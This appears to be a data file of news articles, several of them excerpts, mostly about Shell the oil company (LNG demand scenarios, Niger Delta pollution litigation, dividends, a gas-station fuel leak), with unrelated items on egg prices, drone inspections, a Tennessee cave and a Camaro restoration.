            "content": "It\u2019s a chicken-and-egg problem: Restaurants are struggling with record-high U.S. egg prices, but their omelets, scrambles and huevos rancheros may be part of the problem.\n\nBreakfast is booming at U.S. eateries. First Watch, a restaurant chain that serves breakfast, brunch and lunch, nearly quadrupled its locations over the past decade to 570. Eggs Up Grill has 90 restaurants in nine southern states, up from 26 in 2018. Florida-based Another Broken Egg Caf\u00e9 celebrated its 100th restaurant last year.\n\nFast-food chains are also adding more breakfast items. Starbucks, which launched egg bites in 2017, now has a breakfast menu with 12 separate items containing eggs. Wendy\u2019s reintroduced breakfast in 2020 and offers 10 items with eggs.\n\nReviews website Yelp said 6,421 breakfast and brunch businesses opened in the United States last year, 23% more than in 2019.\n\nIn normal times, producers could meet the demand for all those eggs. But an ongoing bird flu outbreak, which so far has forced farms to slaughter nearly 159 million chickens, turkeys and other birds \u2014 including nearly 47 million since the start of December \u2014 is making supplies scarcer and pushing up prices. In January, the average price of eggs in the U.S. hit a record $4.95 per dozen.\n\nThe percentage of eggs that go to U.S. restaurants versus other places, like grocery stores or food manufacturers, is not publicly available. U.S. Foods, a restaurant supplier, and Cal-Maine Foods, the largest U.S. producer of shell eggs, did not respond to The Associated Press\u2019 requests for comment.\n\nBut demand from restaurants is almost certainly growing. Foot traffic at U.S. restaurants has grown the most since 2019 for morning meals, 2019, according to market research firm Circana. Pre-lunchtime hours accounted for 21% of total restaurant visits in 2024.\n\nBreakfast sandwiches are the most popular order during morning visits, Circana said, and 70% of the breakfast sandwiches on U.S. menus include eggs.\n\nEggs Up Grill CEO Ricky Richardson said breakfast restaurants took off after the COVID pandemic because people longed for comfort and connection. As inflation made food more expensive, customers saw breakfast and lunch as more affordable options for eating out, he said.\n\nThe growth in restaurant demand reverses a pattern that emerged during the pandemic, when consumers tried to stock up on eggs for home use but restaurants needed fewer of them because many of them had to close for a time, according to Brian Earnest, a lead economist for animal proteins at CoBank.\n\nChanging preferences since then have caused further market strain. Americans are increasingly looking for protein with few added ingredients, and eggs fit that bill.\n\n\u201cConsumers think eggs are really fresh, so if you\u2019re making something with eggs, you know it\u2019s fresh,\u201d Earnest said.\n\nTo address animal rights concerns, McDonald\u2019s and some other companies have switched to 100% cage-free eggs, which limits the sources they will buy from. Ten states, including California and Colorado, have passed laws restricting egg sales to products from cage-free environments.\n\n\u201cIt makes the market much more complicated than it was 20 years ago,\u201d Earnest said.\n\nThe higher prices are hitting restaurants hard. Wholesale egg prices hit a national average of $7.34 per dozen last week, according to the U.S. Department of Agriculture. That was 51% higher than at the beginning of the year. Wholesale costs may be higher than retail prices since grocers use eggs as a loss leader to get customers in the door.\n\nSome chains, like Waffle House, have added a surcharge to help offset the cost of eggs. Others may turn to egg substitutes like tapioca starch for some recipes or cut egg dishes from the menu, said Phil Kafarakis, the president and CEO of the International Foodservice Manufacturers Association.\n\nFirst Watch President and CEO Chris Tomasso said eggs are critical for the chain\u2019s brand and are found in the majority of its offerings, whether at the center of the plate or as an ingredient in batters. So far, he said, the company has been able to obtain the eggs it needs and isn\u2019t charging extra for them.\n\nFirst Watch is also increasing portion sizes for non-egg items like meat and potatoes, Tomasso said.\n\nRichardson, of Eggs Up Grill, said he recently met with franchisees to discuss adding a surcharge but they decided against it.\n\n\u201cEggs have always been and will continue to be an important part of American diets,\u201d Richardson said.",

            "content": "The world\u2019s top LNG trader, Shell, expects global demand for liquefied natural gas to jump at least through 2030 in all scenarios it has modeled in a new energy security report.\n\nThe 2025 Energy Security Scenarios, which the supermajor says are not expressions of Shell\u2019s strategy or business plan, show that LNG demand is set for significant growth in the near term in all three scenarios.\n\nMost analysts expect that by 2030, LNG demand will be fueled by growing consumption of LNG in Europe to offset the loss of Russian pipeline gas supply and ensure enough gas in storage for winter heating seasons, as well as rising demand in Asian economies, to replace part of the coal-fired power generation and to use more gas in industrial production.\n\nSupply, on the other hand, is also set to grow, especially after 2027\u2014thanks to major new expansion projects in the world\u2019s second-largest LNG exporter, Qatar, and to new projects launching in the world\u2019s biggest exporter, the U.S.\n\nShell\u2019s Three Scenarios of the Future of Energy\n\nIn all three of Shell\u2019s scenarios, LNG shows significant growth in the near term, fuelled by ongoing projects in Qatar and the USA, reaching around 550 million tonnes per year (mtpa) by the end of the decade.\n\n\u201cDivergence between the scenarios is a function of project timelines up until about 2030, but after that, the scenarios diverge significantly as the different scenario drivers take hold,\u201d the supermajor said in the report.\n\nRelated: The End of Coal Is Nowhere In Sight\n\nShell has modeled its new energy security expectations with the rise of AI in mind. The three scenarios are dubbed Surge, Archipelagos, and Horizon and reflect different economic, geopolitical, and energy transition assumptions for the near future and the long term.\n\nIn Surge, Shell assumes that AI technologies take root and lead to a period of stronger economic growth and a surge in energy demand globally.\n\nThe Archipelagos scenario assumes that the security mindset that is very visible today becomes entrenched worldwide, with national self-interest prevailing. In this scenario, Shell expects global sentiment to shift away from managing emissions towards resource, border, and trade security.\n\nFinally, the Horizon scenario assumes that the world reaches net-zero CO2 emissions by 2050 and delivers a global average temperature rise below 1.5 degrees Celsius by 2100.\n\nSurge is the most bullish scenario for energy and LNG demand and supply growth, with LNG supply continuing to grow, reaching 700 mtpa. Most of the additional supply would come from new projects in North America, some of which will involve new field production and new LNG facilities. LNG\u2019s market share of overall global gas demand would reach around 25% by 2050, up from around 14% in 2024, Shell says.\n\nHeightened focus on energy security in the Archipelagos scenario will have a net effect of a well-balanced and stable LNG market throughout the 2030s, plateauing at around 600 mpta.\n\nIn Horizon, the net-zero scenario, global gas demand would need to begin declining this decade for net zero in 2050. This would begin to affect LNG, with demand peaking in the early 2030s. This results in existing infrastructure operating at low utilization rates as demand falls faster than the natural decline rate of the assets.\n\nActual global economic and political developments and demand for fossil fuels, including LNG, will certainly be somewhere between these scenarios. Currently, the world appears closest to the Archipelagos model, with energy and trade security at the top of buyers' minds.\n\nOil Demand\n\nShell\u2019s scenarios also include estimates of peak oil demand, depending on the scenario. But in all three models, electrification of road transport is the main reason for the world reaching peak oil demand, which is after 2030 in Archipelagos and Surge and before 2030 in the net-zero Horizon model.\n\nHowever, demand for oil is not going away, and it will be there in the 22nd century, Shell says, noting that in Horizon, oil is used solely for petrochemicals by 2100.\n\nShell also stressed in its report that global oil demand is likely to grow by 3?5 million barrels per day (bpd) into the early 2030s, with a long but slow decline after that as petroleum remains an affordable and convenient fuel, particularly in transport, and an important feedstock for the petrochemical industry.\n\nFinally, Shell highlights that continued oil and gas investment will be needed in all three scenarios, including Horizon.\n\n\u201cUpstream investment is currently around $600 billion a year. This will be required for decades to come as the rate of depletion of oil and gas fields is two to three times the potential future annual declines in demand,\u201d Shell said.\n\nThe supermajor, along with the other European oil and gas giants such as BP and Equinor, has recently announced a return to the basics, targeting to boost hydrocarbon production and scaling back investments and targets in the renewable energy sector. The pivot has not been only dictated by the heightened energy security and affordability issues since 2022, but also by Big Oil\u2019s charm offensive to offer compelling returns to shareholders.\n\nBy Tsvetana Paraskova for Oilprice.com\n\nMore Top Reads From Oilprice.com",

Here, a look at one of the technologies that made this operation possible: the command and control (C2) solution that ensured seamless connectivity throughout the mission.\n\nReliable Connectivity for Long-Distance BVLOS Operations\n\nConducting extended BVLOS flights requires uninterrupted communication between the aircraft and its operators. PAU utilized the Event 38 E455 UAS, a fixed-wing, vertical takeoff and landing (VTOL) drone, to conduct 16 BVLOS flights across the pipeline route. Equipped with a high-resolution camera, the aircraft logged 332.4 miles of total flight distance, delivering real-time video and telemetry data to SPLC inspectors for immediate analysis and archival purposes.\n\nA key enabler of the mission\u2019s success was Elsight\u2019s Halo, a compact connectivity solution that aggregates multiple IP links\u2014including cellular, satellite, and RF technologies\u2014to ensure a secure, fail-safe connection. This capability is particularly critical for long-distance, remote, and industrial UAS operations, where network redundancy prevents single points of failure and supports regulatory compliance.\n\n\u201cWe saw the difference in our results when using Elsight Halo for continuous connectivity\u2014in the precision of the data collected, the distance flown, and the ability to remotely control the UAV from an offsite location,\u201d said Will Wheeler, Director of Operations at Phoenix Air Unmanned. \u201cWhen connectivity is that robust, it becomes a foundation for regulatory approvals and significantly scales our operations.\u201d\n\nScaling UAS for Infrastructure Inspections\n\nWith growing industry demand for autonomous infrastructure monitoring, the success of this BVLOS patrol reinforces the scalability of UAS for critical asset inspections. The ability to conduct a 300-mile linear pipeline survey in a single flight day demonstrates the potential for reduced operational costs, improved data collection, and enhanced safety compared to traditional inspection methods.\n\n\u201cElsight has developed innovative wireless dispersion capabilities that eliminate single points of failure and ensure mission continuity over complex terrain and in challenging conditions,\u201d said Yoav Amitai, CEO of Elsight. \u201cWe are pleased to support leading UAS manufacturers and operators in the U.S. as they demonstrate new real-world applications that benefit both industry and society.\u201d\n\nAbout Phoenix Air Unmanned\n\nFounded in 2014, Phoenix Air Unmanned (PAU) is an industry leader in utility infrastructure inspections, with more than 17,500 miles of unmanned linear inspections completed. As an affiliate of Phoenix Air Group, Inc., a Part 135 air carrier, PAU specializes in BVLOS operations, FAA authorizations, and safety management systems. In 2021, it became the first registered International Standards for Business Aircraft Operations (IS-BAO) Stage 1 operator for remotely piloted aircraft systems.\n\nAbout Elsight\n\nElsight (ASX:ELS) provides robust, secure, high-bandwidth connectivity solutions for unmanned aerial and ground systems across commercial and defense markets.

The multinational headquartered in London, along with the Nigerian government, has repeatedly stated that work to clean up oil-contaminated sites of Ogoniland, which kicked off around eight years ago, is going well. But the BBC has discovered evidence that they were warned repeatedly over several years that the scheme, set up by the government and funded by various oil firms to the tune of $1bn (\u00a3805m), has been suffering from a string of issues. One close observer has described the clean-up project as a \"con\" and a \"scam\" that has wasted money and left the people of Ogonliland, which lies in the Niger Delta, continuing to live with the devastating impact of oil pollution - 13 years after a ground-breaking UN report lifted the lid on the seriousness of their situation. Shell's Nigerian subsidiary told the BBC: \"The operating environment in the Niger Delta remains challenging because of the huge scale of illegal activities such as oil theft. \"When spills do happen from our facilities we clean up and remediate, regardless of the cause. If it's an operational spill, we also compensate people and communities.\" The allegations come as a civil trial is expected to begin on Thursday at the High Court in London, where lawyers representing two Ogoniland communities of around 50,000 inhabitants will say Shell must take responsibility for oil pollution that occurred between 1989 and 2020, allegedly from its infrastructure. The communities say the spills have left them without clean water, unable to farm and fish, and created serious risks to public health. Shell, which has been pushing to sell its assets in the West African country to focus on offshore drilling and onshore gas, has indicated it will defend the claims. It denies wrongdoing and says spills in the region have been caused by sabotage, theft and illegal refining for which the company says it is not liable. The BBC has visited the affected areas in the Niger Delta, where Shell, the largest private oil and gas company in the country, discovered the existence of crude oil 68 years ago. The UN says at least 13 million barrels - or 1.5 million tonnes - of crude oil have been spilled since 1958 in at least 7,000 incidents in the Niger Delta region. The spills have left many families worried for their health and livelihoods.\n\nGrace Audi, 37, lives with her partner and two-year-old in Ogale in Rivers state, where there have been at least 40 oil spills from Shell's infrastructure, according to Leigh Day, the UK-law firm representing the communities in this case. Her family and neighbours only have access to a contaminated borehole, forcing them to buy clean water to use for drinking, cooking, washing and, once a day, flushing, at a cost of 4,500 Nigerian naira ($3, \u00a32.40) - in an area where the average daily wage is less than $8. It is a familiar story to many in Niger Delta's Rivers state. Paulina Agbekpekpe told the BBC that lush greenery once surrounded thriving mangroves of her community in Bodo - which is not one of those going to court on Thursday. She said the rivers and ponds used to brim with all kinds of animals and fish, particularly periwinkle. \"The place was greener, not only mangroves, but all by the shoreline - there were pawpaw trees, palm trees and more. But during the spills, the destruction has polluted everywhere,\" the 50-year-old mother of six said. Her family had for generations survived on fishing, until a devastating spill 10 years ago. \"Most of the children - from the drinking water - have got diseases. Many have died. I've lost eight kids. My husband is sick. \"Because our livelihoods have been taken away, people in Bodo are hungry and suffering.\" In 2011, the UN's Environment Programme (UNEP) published a major study into the impact of pollution on the oil-rich area. It found members of one community in Ogoniland were drinking water contaminated with a known carcinogen at levels more than 900 times above the World Health Organization (WHO) guideline. The same chemical, benzene, was detected in all their air samples. It also found that sites that Shell's Nigerian subsidiary, the Shell Petroleum Development Company of Nigeria (SPDC), claimed to have remediated, were still polluted and the techniques they used did not reach regulatory requirements. The report concluded that a comprehensive clean-up of the area would take 25-30 years - and it led to the formation of the Hydrocarbon Pollution Remediation Project (Hyprep). This was initially established by the Nigerian government in 2012, but no clean-up was started - until it was relaunched by a new government in December 2016. Hyprep was part-funded by oil companies including the state-owned Nigerian National Petroleum Company (NNPC) and Shell, which gave $270m.\n\nFishermen showed the BBC that oil is present in the waterways of Ogoniland\n\nHowever, the BBC has seen internal documents that suggest representatives of Shell and of the Nigerian government were warned numerous times of the agency's alleged fraudulent practices. One person aware of the project spoke to the BBC about their concerns - and asked to remain anonymous out of a fear of reprisals. \"It's common knowledge that really what we're doing is a scam. Most of it is to fool the Ogoni people,\" the whistleblower said. \"It's a con perpetuated so that more money can be put into the pot and end up in the pockets of politicians and other people in power.\" The allegations about failings at Hyprep include: Contracts being awarded to companies that had no relevant experience\n\nLaboratory results being falsified - sometimes labelling contaminated soil and water as clean\n\nProject costs being inflated\n\nExternal auditors on occasion being blocked from checking the clean-up on sites had been done properly. In the minutes of one meeting in 2023, attended by representatives from Shell's Nigerian subsidiary, the UNEP and Hyprep, it was pointed out that \"incompetent\" contractors were \"being engaged again\" and that they should \"not be allowed to further degrade the environment\". In a separate leaked report seen by the BBC from the same year, it was pointed out that laboratory results were \"regularly reported with deviations\". In 2022, the UN wrote to the Nigeria's environment ministry, warning that if nothing changed, the \"extremely poor standards\" of the clean-up would continue. The BBC has asked Hyprep and the Nigerian government to comment on the allegations but has received no response. But our investigation has revealed evidence that Shell was aware of the problems. In a meeting with the British high commissioner to Nigeria in January last year, minutes of which were obtained under the Freedom of Information Act, Shell representatives acknowledged the \"institutional challenges\" of the clean-up agency and the chance of the refusal of \"future funding\" towards it. Shell told the BBC: \"Hyprep is an agency established and overseen by the federal government of Nigeria, with its governing council largely made up of senior ministers and government officials, along with five representatives of communities and NGOs and a single SPDC representative.\"\n\nAFP The UN warned in 2011 it could up to 30 years to clean up the oil pollution in Ogoniland\n\nThis is not the only remediation project in the Niger Delta that is alleged to have been botched. In 2015, Shell agreed to a \u00a355m settlement for a clean-up after two catastrophic spills in 2008 from its infrastructure in the area Bodo. The company said the clean-up, conducted by the Bodo Mediation Initiative (BMI), which is meant to serve as a mediator between oil companies, including Shell, and the Bodo community (and is part-funded by the oil giant and Nigerian regulators) has been certified as 98% complete. However, the BBC visited sites within the area and found crude oil oozing from the soil and floating on waters. Shell and the BMI insist any occurrences of oil spills in the region are because of theft - known in the industry as \"oil bunkering\". \"There is a plan to call back the contractors to clean those areas to specification, to standard,\" Boniface Dumpe, a director at the BMI, told the BBC. \"It is the responsibility of all stakeholders, Shell, yes, to take care of their facilities, to ensure that re-oiling does not come from their facilities. \"But for the areas that have been cleaned. I would think that some responsibility is also for the community to ensure that some illegal activities does not also cause re-pollution.\" Shell said it takes active measures to prevent oil spills caused by oil bunkering. The company said: \"We take extensive steps to prevent this activity and the spills it causes including aerial surveillance, removing illegal connections on pipelines, and by building steel cages to protect wellheads.\" The alleged failings in the oil clean-up come as Shell prepares to sell its Nigerian subsidiary, the SPDC, to Renaissance Africa, a consortium of local and international companies.\n\nPatience Ogboe says she planted this crop of maize four months ago but it has not grown properly\n\nSome locals have accused the oil giant of \"running away\" from properly cleaning up the land and waters it is alleged to have polluted. They also fear Shell may still profit from the area by simply trading the oil extracted from the region in future. \"The operations of whichever oil operator takes over the relevant pipelines will have an enormous impact on their day-to-day life,\" Joe Snape, a lawyer at Leigh Day, told the BBC. \"There's incredibly little detail about what these deals will lead to. \"It is unclear how Renaissance [Africa] will act going forward. At least with Shell we have means of holding them to account.\" Mineral products, like petroleum oil and gas, account for 90% of exports from Nigeria, most of which comes from the Niger Delta region. Locals, whose main source of livelihood has been agriculture and fishing, told the BBC that since the discovery of oil, or what some refer to as \"black gold\", their home had been pumped for profit - by major oil companies, by oil thieves and by corrupt politicians. They say they have seen no benefit, only suffering - like Patience Ogboe who blames recent oil spills in Rivers state for her failing crops. \"Formerly if I harvest I can eat some with my family and even sell some\u2026 but for the past few years I could not get anything. It's really bad,\" the 42-year-old the BBC.\n\nYou may also be interested in:\n\nGetty Images/BBC",

Lawmakers who supported the subsidy pointed to studies commissioned by Shell that claimed the plant would provide significant economic revitalization to the region.\n\n\u201cIf you're a taxpayer in Pennsylvania, you should be asking for a refund right about now because you got robbed,\u201d study co-author Eric de Place said during a press call. \u201cThere are hardworking people in that county who deserve better.

            "content": "We recently compiled a list of the 12 Best International Dividend Stocks To Buy Now. In this article, we are going to take a look at where Shell plc (NYSE:SHEL) stands against the other international dividend stocks.\n\nDividend stocks have been grabbing investors' attention for a while now. According to JP Morgan, over the last two decades, global dividends per share have increased at an annual rate of 5.6%, but analysts expect this to rise to 7.6% in the future, driven by historically low payout ratios. During the 2020 pandemic, many companies cut dividends, but as earnings have recovered, especially in Big Tech and AI, dividends have not kept up. With payout ratios at 25-year lows, simply returning to normal could add 2% annual growth over the next five years.\n\nAfter slowing down post-COVID, global dividend growth made a surprising comeback last year, increasing 8% and adding an extra $180 billion in payouts despite ongoing economic and geopolitical challenges. According to S&P Global, this was largely driven by record dividend initiations in US tech, European banks, Japan\u2019s auto industry, and solid growth from China. Even oil and gas companies held strong despite market volatility. Looking ahead, experts predict global dividends will hold steady at $2.3 trillion in 2025.\n\nRegionally, developed Asia, which includes Japan, Hong Kong, Australia, South Korea, and Singapore, is looking at a 3% rise in dividends this year. Europe, on the other hand, is expected to see a 3.4% decline. In emerging markets, the trends are mixed. Asia, led by China, India, and Taiwan, is on track for a 5% increase, while dividends in the Middle East and Africa could drop by 20%, mainly because Saudi Aramco\u2019s special dividend program ended. Latin America is also expected to see a small dip of around 4%.\n\nWhen it comes to sectors, banks and energy companies remain the biggest dividend payers. Banks are expected to distribute around $380 billion globally, but after four years of rapid 20% growth, they are now down to just 2%. Banks are playing it safe, waiting to see how interest rates move. Given this, we will take a look at some of the best international dividend stocks.\n\nOur Methodology\n\nFor this article, we used the BlackRock International Dividend ETF to filter out dividend stocks listed on US exchanges but headquartered internationally.

The pollution caused widespread devastation to the local environment, killing fish and plant life, leaving thousands of people without access to clean drinking water.\n\nThe communities brought their claims in the UK courts however Shell repeatedly delayed the case arguing it had no legal responsibility for any of the pollution. The delay has had a devastating effect on people\u2019s lives.\n\nOn 6 December 2024, the UK Court of Appeal gave the green light for the case finally to go ahead. Isa Sanusi, Amnesty International\u2019s Country Director for Nigeria, said:\n\n\u201cThe Bille and Ogale communities of Nigeria\u2019s Niger Delta oil-producing region have been living with the devastating impact of oil pollution for so long. Oil companies, particularly Shell, exposed them to multiple oil spills that have done permanent damage to farmlands, waterways, and drinking water \u2013 leaving them unable to farm or fish.\n\n\u201cWater contamination and other impacts affect even babies that are in some cases born with deformities. These communities have been deprived of a good standard of living. They deserve justice and effective remediation, and I hope this long-overdue trial goes someway to providing it.\u201d\n\nAmnesty International has published numerous reports, documenting the detrimental impact Shell\u2019s operations are having on Nigerian communities. Going forward, Amnesty International is calling for Shell to conduct meaningful consultation with affected communities about its plans for disengagement. Shell must also provide a full remediation plan including details of all completed and ongoing clean-ups across its areas of operation, as well as adequate compensation for the severe and sustained harm affected communities have faced as a result of Shell\u2019s operations in the Niger Delta.\n\nBackground\n\nThe two communities from Nigeria will be represented by Leigh Day. The Shell Preliminary Issues Trial of Nigerian Law will aim to resolve a number of Nigerian private and constitutional law questions, with a view to confirming the legal framework to be applied to the subsequent trial between Shell and the Ogale and Bille communities.\n\nThe Court of Appeal heard the Shell Nigeria oil spill appeal on 8 October 2024. On 11 October 2024, the Court of Appeal ruled in favour of Nigerian communities over alleged pollution by oil giant Shell. On 6 December 2024, a full trial of Nigerian communities\u2019 claims against Shell was given the go ahead.\n\nOver the past 20 years, Amnesty International has conducted extensive research and documented the human rights and environmental impact of Shell\u2019s operations in the Niger Delta. In Amnesty\u2019s 2023 report, Nigeria: Tainted Sale?, the organization recommended a series of safeguards to protect the rights of people potentially affected by Shell\u2019s planned disposal of its oil interests in Nigeria.",

They deserve justice and effective remediation, and I hope this long-overdue trial goes someway to providing it.\"\n\nIn 2023, the U.K. Supreme Court ruled in a separate but related case that it was too late for Nigerian plaintiffs to sue a pair of Shell subsidiaries over a 2011 spill of an estimated 40,000 barrels of oil.\n\nAmnesty International has called the Niger Delta \"one of the most polluted places on Earth.\"\n\nAccountability has been rare, but in 2021 Shell agreed to pay $111 million for oil spills in the Niger Delta. This, in a year in which the company reported adjusted 2020 earnings of nearly $5 billion.\n\nLast December, Nigeria's Ministry of Petroleum Resources approved Shell's sale of $2.4 billion in offshore and shallow-water assets to Renaissance Group, a Nigerian firm, marking the end of nearly a century of Shell's operations in the African nation. The Nigerian government is also currently in talks with local communities about resuming oil production in Ogoniland, which has been devastated by spills over the past half-century.\n\nResponding to the U.K. Court of Appeals' greenlighting of the case set to be heard later this week, Bille Chief Bennett Okpoki said in December that \"this has taken a very long time as Shell has been delaying for around 10 years.\"\n\n\"The spills have terribly affected the Bille community,\" he continued. \"Our ecosystems are dead. Our livelihood depends on fishing. After the oil spills, we have found it very difficult to survive and people are not finding it easy. We hope it continues, so we can have a final victory over Shell, at least for them to come and do the cleanup, to put us in the place we were before.\"\n\n",

            "content": "ROCKVALE, Tenn. (WKRN) \u2014 Located in western Rutherford County, Snail Shell Cave is 13 miles of underground water passage through the limestone of Middle Tennessee.\n\nSnail Shell Cave has been known by local residents for years. In 2002, the Southeastern Cave Conservancy purchased the cave to conserve it for scientific research and education, while still allowing the public to visit the property.\n\nThe cave is at the bottom of a 100-foot deep by 300-foot wide sinkhole. It should be noted that it is a steep trek down the sides of the sinkhole to reach the cave\u2019s entrance. In fact, the cave itself is for experienced cavers, not beginners, especially since the cave is not lit like commercial caves.\n\nAdvertisement Advertisement\n\nAdvertisement\n\nBob Biddix is the property manager for the cave and is an expert caver.\n\n\u201cIt\u2019s a very enjoyable cave,\u201d Biddix said. \u201cBut the water itself does mean that it\u2019s going to be fairly cold. The temperature is 56 degrees year-round. That means the water is also 56 degrees. That said, hypothermia can be a big problem if you don\u2019t come in properly prepared with exposure suits, wet suits, things of that nature. But it\u2019s a wonderful, wonderful cave that has lots of unique formations and things to see.\u201d\n\n(Courtesy of Bob Biddix) (Courtesy of Bob Biddix) (Courtesy of Bob Biddix) (Courtesy of Bob Biddix) (Courtesy of Bob Biddix) (Courtesy of Bob Biddix)\n\n\u201cThe cave itself is one of the longer water caves in the state, if not the entire United States, consisting of about thirteen miles of surveyed passage\u201d Biddix added. \u201cMost of it is water. There are very few dry passages, but most of it is water-filled passage.\u201d\n\n\u23e9 Read today\u2019s top stories on wkrn.com\n\nSince the cave isn\u2019t recommended for beginners, News 2\u2019s Davis Nolan asked Brian Krebs, a member of the Southeastern Cave Conservancy, for a few tips about safe caving.\n\nAdvertisement Advertisement\n\nAdvertisement\n\n\u201cDon\u2019t ever cave alone, although some people do,\u201d Krebs said. \u201cAlways let somebody know when you are going and when you expect to be out. Three sources of light are a great idea, a helmet just like I am wearing or something similar that\u2019s got a chinstrap. Take extra food, water, and a couple of layers with you in case in case you get cold. Extra batteries aren\u2019t a bad idea.\u201d\n\nProtection from the water and cold is a must in the Snail Shell Cave.\n\nTo visit the property, you have to obtain a permit from the Southeastern Cave Conservancy.

            "content": "Every end has a beginning, and this is it: an empty black husk of a 1968 Chevrolet Camaro that traveled six decades and tens of thousands of miles to arrive at its new home.\n\nIndeed this car lived a full life before it rolled into the Snoqualmie, Washington, shop where it\u2019ll transform from an empty vessel to the stuff of hell-raising lap-turning redneck fantasy.\n\nWelcome to Camaro vs. World, a build series wherein an empty husk becomes a Trans-Am inspired road car for turnin' laps, burnin' tires, and haulin' ass. Amen.\n\nPhoto by: Kyle Kinard / Motor1\n\nMy partner in the project, Levi, received the car in a trade from his father, who picked up the car from a winemaker in Yakima, WA.\n\nThe winemaker\u2019s wife was a drag racer and for years she ran the car at the local strip. God knows how many times this Camaro ripped passes, but the scars of a life well-lived are all that\u2019s left to bear that history, visible in the hammered-out wheel wells and a thousand tiny jagged scars to the underbody.\n\nPhoto by: Kyle Kinard / Motor1\n\nAt some point under their stewardship, the winemaker and his wife added custom pin-striping that\u2019d look right at home on a Kobe Bryant tribute banner. Combined with a splash of blue on the car's tail, it's a livery fit for the play pen of some grimy disgraced fast-food chain.\n\nWelcome to McDingles, can I take your order?\n\nI find it oddly charming.\n\nPhoto by: Kyle Kinard / Motor1\n\nOf course, the Seventies hooptie chic coats every corner of the black pleather interior. It should be noted the seats, panels, and dash are not original, but they are in remarkable shape. These pristine elements will be sold to someone with a specific kind of taste, swapped out for more purposeful seats and door panels, and a racier dash with the perfect three-spoke steering wheel.\n\nYou won\u2019t have missed the hole in the Camaro\u2019s hood either, carved crudely by an ancient sawzall. That hole once made way for the carb\u2019d stack of some proud chromed-up thunderbastard that Levi\u2019s dad kept in the trade. I think it's in a boat now.\n\nPhoto by: Kyle Kinard / Motor1\n\nInstead, our Camaro\u2019s nose sits up like a bird dog at proud attention, not an ounce of weight sagging at its front springs.\n\nThat stance only hints at endless possibilities.\n\nSo what goes into that big hole in the hood? Therein lies the rub, the soul of the project itself. It\u2019s a question fundamental to that endpoint I mentioned at the start of the piece.\n\nTo get the Camaro moving, we\u2019ll select from the short blocks on hand in Levi\u2019s shop. Our quorum of two points to an LS2 build that won\u2019t need much beyond the parts and accessories lying around, plus a simple electronic ignition+carb setup just to get this project moving, which may graduate to a full EFI setup in time.\n\nPhoto by: Kyle Kinard / Motor1\n\nThe end goal, however, fills its vast lungs via carburetors, spits anger from a pair of side pipes, and revs to the moon. This will take far more time, research, and expertise to accomplish. If you want a hint at the displacement: think Trans-Am. And not the Hasselhoff kind.\n\nBut first I think it\u2019s best to get this Camaro moving under its own power simply, with the parts at hand. That'll allow us to improve the car on a holistic level, rather than slogging through logistics of sourcing and building an end-game engine while the brakes, chassis, aesthetics, and wheel/tire package go neglected.\n\nIn the next part of our journey, we\u2019ll cover the inspiration driving the project. Our guiding light ensures this Camaro will not have the polish of a Chip Foose creation; It will not betray classic aesthetics by rolling on 18-inch chrome wheels like every modern ProTouring stallion; Nor shall it be enslaved to the scorn of nostalgia.\n\nIt will have attitude and character and a feeling of authenticity above all else.

Residents reported a strong smell of gasoline in the area, and video footage showed a stream of fuel flowing through backyards.\n\n\n\nTaylor Cole, a nearby resident, said, \"I pulled in and there were firefighter trucks on this road. They came by and told us there was a potential gas leak and they just wanted to check the house. They came in with a meter and everything read 0, so they got some information and left.\"\n\nSince the leak, work has been underway at the gas station, where the problem was identified. Another resident who lives on Blue Ridge Blvd was told to evacuate and has yet to return home. According to attorney Ed Merrell, there was also a machine placed under that resident's home in the crawl space and levels are still reading at unsafe levels.\n\nThe Jefferson County Emergency Management Agency (JCEMA) along with several organizations, including Hoover Fire & Rescue, responded to the initial report of the leak.\n\nThe JCEMA assisted HFD in coordinating various response organizations to help determine the source of the fuel leak, the extent of the fumes and the danger they potentially pose to the public, what measures need to be taken to stop the suspected leak, and what steps need to be taken to clean up the suspected leak.\n\nThe coordination effort led to the following organizations responding to the incident: Hoover Stormwater, Jefferson County Department of Health\u2019s Stormwater and Air & Radiation Protection Divisions (for air quality monitoring and advicenothing to do with radiation), National Weather Service\u2019s Birmingham Office (determine past, present, and future weather conditions and plume modeling), Alabama Emergency Management Agency (State notification of a hazardous materials incident), Alabama Department of Environmental Management (for regulatory enforcement action if needed and environmental concerns), and Spire Gas (verify if they were or were not involved and to help cut off gas to businesses or residential structures if needed). Additionally, the Shell Gas Station\u2019s fuel supplier/tank owner/tank monitoring company was on scene, and a cleanup company, hired by the fuel tank owner/supplier/monitoring company.\n\nThe Alabama Department of Environmental Management (ADEM) confirmed that an approved Underground Storage Tank response action contractor was on site, conducting assessment and remediation activities.\n\nApproximately 500 gallons of gasoline have been removed using a vacuum truck. The affected tank has been emptied and remains out of service, according to ADEM.\n\n\"It would be nice to have a heads up, say this happened, look out for this but yeah we got nothing,\" said resident William Walton, who was out of town when the leak was reported. \"I wouldn't imagine any of that is leaching into our drinking water with BWW, but who knows,\" Walton said.\n\nWe reached out to Birmingham Water Works about the leak to learn about any potential contamination.\n\nIn a statement to ABC 33/40, Darryl Jones, interim general manager of Birmingham Water Works, assured residents there is no impact:\n\nThe fuel leak that occurred on Alford Avenue is not close to any of our water sources, and we have not seen nor do we anticipate any impact on our water quality. In the normal course of our operations, we continually and routinely test our water, and we are proud of our well-earned reputation for safe, excellent water. As always, environmental stewardship is a top priority for us, and we continue to support initiatives to ensure a safe, sustainable water supply for our customers and our community.\n\nAttorney Ed Merrell, representing at least two impacted residents, is gathering information for a potential complaint. \"What we're looking at at this point is whether there's any cause of action associated with the current situation and how long has that been going on,\" Merrell said.\n\nMerrell provided photos to ABC 33/40, stating, \"bushes and shrubs in the area were chemically burned and the odor of gasoline was very pungent.\"\n\nMerrell believes the problem could likely stem from before this leak was reported.\n\n\"We do for multiple reasons. The amount of evidence that's turning up, that gasoline has seeped into the water and ground, beyond just the area where the gas was flowing was enough to tell us this has been going on for some extended period of time,\" said Merrell. \"This is a situation where if they are finding the levels below the houses that they are, they may have to destroy the houses to get to the gas to get this cleaned up.\"\n\nWhen ABC 33/40's I-Team asked ADEM about any past violations to that gas station. ADEM confirmed the station received a warning letter following a 2022 inspection, but said since it does not have a history of substantial noncompliance, the spill is eligible for cleanup by the Alabama Tank Trust Fund. Assessment, including the installation of temporary wells, will proceed when weather permits.\n\nResidents are encouraged to notify local authorities if they have any concerns.\n\nA report is being submitted to the U.S. Environmental Protection Agency's National Response Center by the spiller, according to Jefferson County EMA.\n\nABC 33/40's I-Team did stop into the gas station to speak with the owner about this further. They declined to speak on camera, but assured they were handling everything.",

